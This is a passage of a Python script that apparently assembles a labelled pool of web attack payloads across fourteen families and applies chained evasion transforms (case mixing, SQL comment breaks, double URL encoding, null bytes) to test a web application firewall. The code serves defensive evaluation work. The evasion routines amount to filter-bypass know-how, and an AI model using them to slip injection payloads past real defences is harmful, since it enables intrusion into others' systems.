_STRUCT_RX = [(name, re.compile(rx)) for name, rx in _STRUCT_MARKERS]


def _struct_signature(payload: str) -> str:
    dec = canonical(payload)
    hit = [name for name, rx in _STRUCT_RX if rx.search(dec)]
    return "struct:" + ("+".join(hit) if hit else "plain")


# Filled by load_pool: canonical-payload -> template. group_key is deterministic,
# so this lets template_key() resolve any payload (plain or evaded) back to the
# template of its canonical form.
_TEMPLATE_BY_GROUP = {}


def template_key(payload: str) -> str:
    """Template a payload belongs to (for the structural split)."""
    g = group_key(payload)
    if g in _TEMPLATE_BY_GROUP:
        return _TEMPLATE_BY_GROUP[g]
    return _struct_signature(payload)


# Per-family cap on distinct canonical payloads, sized below the family's row
# budget so every retained payload is sampled several times and each family
# yields >=12 held-out test groups.
FAMILY_CAP = {
    "sqli": 340, "xss": 340, "ssti": 200, "ssrf": 190, "nosqli": 175,
    "traversal": 170, "cmdi": 160, "jndi": 95, "ldapi": 95, "protopollute": 90,
    "deser": 85, "crlf": 85, "smuggle": 80, "xxe": 75,
}
DEFAULT_CAP = 150

# Fixed family processing order for global dedup (payloads shared by several
# families are kept for whichever appears first here). Rarer families come first
# so they are not starved of their shared payloads by the common ones.
_FAMILY_ORDER = ["xxe", "smuggle", "crlf", "deser", "ldapi", "protopollute",
                 "jndi", "cmdi", "traversal", "ssrf", "nosqli", "ssti",
                 "sqli", "xss"]


def load_pool(patt_root: str = None, limit_per_family: int = None):
    """Return {family: [(payload, template)]}: seed, grammar, then PATT; deduped.

    Also populates `_TEMPLATE_BY_GROUP` so template_key() resolves any payload —
    including an evaded one — to its canonical template.
    """
    _TEMPLATE_BY_GROUP.clear()
    pool = {fam: [(p, f"{fam}:seed") for p in v] for fam, v in SEED.items()}
    for fam in pool:
        pool[fam].extend(_generate(fam))
    if patt_root and os.path.isdir(patt_root):
        for fam, lines in _load_patt(patt_root).items():
            pool[fam].extend((l, _struct_signature(l)) for l in lines)

    # `global_seen` dedups canonical payloads ACROSS families, not just within
    # one. Some payloads legitimately belong to several families (e.g.
    # `file:///etc/passwd` is both traversal and ssrf and xxe); without global
    # dedup the same canonical string would land in two family strata and could
    # be split independently — the identical payload appearing in both train and
    # test. Families are processed in FAMILIES order so assignment is stable.
    out = {}
    global_seen = set()
    order = [f for f in _FAMILY_ORDER if f in pool] + \
            [f for f in pool if f not in _FAMILY_ORDER]
    for fam in order:
        items = pool[fam]
        cap = limit_per_family or FAMILY_CAP.get(fam, DEFAULT_CAP)
        uniq = []
        for p, tpl in items:
            k = canonical(p)
            if k and k not in global_seen:
                global_seen.add(k)
                uniq.append((p, tpl))
                _TEMPLATE_BY_GROUP[group_key(p)] = tpl
            if len(uniq) >= cap:
                break
        out[fam] = uniq
    return out


# ------------------------------------------------------------- evasions -----
def _url_double(p, rng):
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def _case_mix(p, rng):
    kws = ["select", "union", "or", "and", "script", "alert", "onerror",
           "from", "where", "sleep", "jndi", "ldap"]
    out = p
    for kw in kws:
        def repl(m):
            return "".join(c.upper() if rng.random() < 0.5 else c.lower()
                           for c in m.group(0))
        out = re.sub(kw, repl, out, flags=re.I)
    return out


def _comment_break(p, rng):
    return re.sub(r"\b(union|select|or|and)\b",
                  lambda m: m.group(0) + "/**/", p, flags=re.I)


def _inline_comment(p, rng):
    return p.replace(" ", "/**/") if " " in p else p


def _html_entity(p, rng):
    return "".join(f"&#{ord(c)};" if c in "<>\"'()" else c for c in p)


def _null_byte(p, rng):
    return p + rng.choice(["%00", "\x00", "%00.jpg"])


def _whitespace_swap(p, rng):
    return p.replace(" ", rng.choice(["\t", "%09", "%0a", "+", "/**/"]))


def _unicode_escape(p, rng):
    return p.replace("<", "%3C").replace(">", "%3E").replace("'", "%27") \
            .replace("\"", "%22").replace(" ", "%20")


_EVA_FN = {
    "case_mix": _case_mix, "comment_break": _comment_break,
    "inline_comment": _inline_comment, "url_double": _url_double,
    "whitespace_swap": _whitespace_swap, "html_entity": _html_entity,
    "null_byte": _null_byte, "unicode_escape": _unicode_escape,
}

EVASIONS = {
    "sqli": ["case_mix", "comment_break", "inline_comment", "url_double", "whitespace_swap"],
    "xss": ["case_mix", "html_entity", "unicode_escape", "url_double"],
    "cmdi": ["whitespace_swap", "url_double", "null_byte"],
    "traversal": ["url_double", "null_byte", "unicode_escape"],
    "ssti": ["url_double", "whitespace_swap"],
    "nosqli": ["url_double", "case_mix"],
    "ssrf": ["url_double", "unicode_escape"],
    "crlf": ["url_double"],
    "ldapi": ["url_double", "null_byte"],
    "xxe": ["url_double", "unicode_escape"],
    "jndi": ["case_mix", "url_double"],
    "deser": ["url_double"],
    "protopollute": ["url_double", "case_mix"],
    "smuggle": ["url_double"],
}


def apply_evasion(payload: str, family: str, rng: random.Random,
                  chain_rate: float = 0.0):
    """Return (transformed_payload, evasion_name) or (payload, 'none').

    With `chain_rate` > 0 a second (and sometimes third) distinct transform may
    be applied on top of the first, producing composite evasions like
    `case_mix+url_double`. Chained encodings are the realistic hard case a WAF
    must survive; v2.1 applied at most one transform.
    """
    names = EVASIONS.get(family)
    if not names:
        return payload, "none"
    order = names[:]
    rng.shuffle(order)
    applied, cur = [], payload
    for name in order:
        if applied and rng.random() >= chain_rate:
            break
        try:
            out = _EVA_FN[name](cur, rng)
        except Exception:
            continue
        if out != cur:
            cur = out
            applied.append(name)
        if len(applied) >= 3:
            break
    if not applied:
        return payload, "none"
    return cur, "+".join(applied)


if __name__ == "__main__":
    p = load_pool(patt_root="../data/patt")
    total = 0
    for fam, items in p.items():
        total += len(items)
        tpls = len({t for _, t in items})
        print(f"{fam:14s}: {len(items):>5} payloads, {tpls:>3} templates")
    print("total payloads:", total, "| total groups:", len(_TEMPLATE_BY_GROUP))
